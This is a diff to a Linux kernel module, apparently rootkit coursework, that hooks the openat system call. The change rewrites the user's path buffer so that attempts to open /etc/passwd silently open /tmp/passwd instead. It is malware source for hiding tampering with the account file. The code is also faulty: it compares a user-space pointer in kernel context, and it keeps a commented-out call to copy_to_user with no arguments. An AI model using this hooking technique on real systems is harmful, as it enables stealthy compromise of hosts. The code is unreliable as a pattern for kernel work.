@@ -100,12 +100,23 @@ asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
   const char *pathname = (const char *)regs->si;
   // Implement the sneaky part here
   if (strcmp(pathname, "/etc/passwd") == 0) {
-      char new_path[150];
-      strncpy(new_path, "/tmp/passwd", sizeof(new_path));
-      // Make sure the new path is null-terminated
-      new_path[sizeof(new_path) - 1] = '\0';
-      pathname = new_path;
-    }
+      char new_path[150] = "/tmp/passwd";
+      int path_len = strlen(new_path) + 1; // Add 1 for the null terminator
+      if (copy_to_user((void *)regs->si, new_path, path_len)) {
+        printk(KERN_ERR "copy_to_user failed\n");
+      }
+      printk(KERN_INFO "Sneaky openat is called.\n");
+  }
+  // const char *pathname = (const char *)regs->si;
+  // // Implement the sneaky part here
+  // if (strcmp(pathname, "/etc/passwd") == 0) {
+  //     char new_path[150];
+  //     copy_to_user();
+  //     // Make sure the new path is null-terminated
+  //     new_path[sizeof(new_path) - 1] = '\0';
+  //     pathname = new_path;
+  //     printk(KERN_INFO "Sneaky openat is called.\n");
+  //   }
   return (*original_openat)(regs);
 }
 
